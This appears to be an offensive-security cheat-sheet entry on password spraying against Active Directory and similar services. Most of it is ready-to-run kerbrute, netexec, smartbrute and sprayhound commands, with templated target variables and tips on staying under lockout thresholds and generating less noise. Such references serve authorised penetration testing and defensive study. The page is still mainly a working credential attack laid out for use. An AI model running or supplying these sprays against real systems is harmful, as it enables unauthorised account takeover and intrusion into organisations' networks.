---
technique: PasswordSpraying
category: bruteforcing
protocols: SMB, LDAP, Kerberos, WinRM, SSH, MSSQL
remote_capable: true
tags: spraying bruteforce credential-attack password ad lockout
---

# PasswordSpraying

Password spraying tests one or a few passwords against many accounts, inverting the lockout risk relative to traditional per-account bruteforce. The technique is most effective when the organization's lockout threshold is known, and when combined with smartbrute's or sprayhound's policy-aware modes that track remaining attempts per account.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| User list | Enumerated via LDAP, Kerberos pre-auth errors, or OSINT |
| Lockout policy | Know the threshold before spraying to avoid mass lockouts |
| Low-priv creds (smart mode) | smartbrute and sprayhound fetch the live policy dynamically |

## Windows

### kerbrute (Windows)

#go #kerberos #spraying

Spray a password against a list of usernames over Kerberos pre-authentication from a Windows host.

```powershell title:"Password spray via kerbrute on Windows"
.\kerbrute.exe passwordspray -d "$domain" --dc "$rhost_ip" users.txt "$spray_password"
```
<!-- cheat
import domain_ip
var spray_password
-->

## Linux

### netexec (SMB spray)

#smb #spraying #multi-target

Spray a single password across a user list over SMB; use `--no-bruteforce` to pair users 1:1 and `--continue-on-success` to avoid stopping on first hit.

```sh title:"Password spray via netexec over SMB"
nxc smb "$rhost_ip" -d "$domain" -u users.txt -p "$spray_password" --no-bruteforce --continue-on-success
```
<!-- cheat
import domain_ip
var spray_password
-->

### netexec (LDAP spray)

#ldap #spraying #multi-target

Spray a single password across a user list over LDAP; use `--no-bruteforce` to pair users 1:1 and `--continue-on-success` to avoid stopping on first hit.

```sh title:"Password spray via netexec over LDAP"
nxc ldap "$rhost_ip" -d "$domain" -u users.txt -p "$spray_password" --no-bruteforce --continue-on-success
```
<!-- cheat
import domain_ip
var spray_password
-->

### kerbrute

#go #kerberos #spraying

Spray a password against a user list over Kerberos pre-authentication; generates less noise than LDAP/SMB auth attempts.

```sh title:"Password spray via kerbrute over Kerberos"
kerbrute passwordspray -d "$domain" --dc "$rhost_ip" users.txt "$spray_password"
```
<!-- cheat
import domain_ip
var spray_password
-->

### smartbrute (static user list)

#python #kerberos #spraying #lockout-safe

Spray credentials while dynamically fetching the domain lockout policy using a static user list to stay within the safe attempt window.

```sh title:"Policy-aware password spray via smartbrute with static user list"
smartbrute brute -bU users.txt -bp "$spray_password" kerberos --kdc-ip "$rhost_ip"
```
<!-- cheat
import domain_ip
var spray_password
-->

### smartbrute (live LDAP enumeration)

#python #kerberos #ldap #spraying #lockout-safe

Spray credentials while dynamically fetching the domain lockout policy and enumerating users live via LDAP.

```sh title:"Policy-aware password spray via smartbrute with live LDAP enumeration"
smartbrute smart -bp "$spray_password" kerberos -d "$domain" -u "$user" -p "$pass" --kdc-ip "$rhost_ip" kerberos
```
<!-- cheat
import domain_ip
import users
import passwords
var spray_password
-->

### sprayhound

#python #ldap #spraying #lockout-safe #bloodhound

Spray credentials while tracking per-account lockout counters and optionally marking owned accounts in BloodHound.

```sh title:"Policy-aware password spray via sprayhound"
sprayhound -u "$user" -p "$pass" -d "$domain" -dc "$rhost_ip" --password "$spray_password"
```
<!-- cheat
import domain_ip
import users
import passwords
var spray_password
-->
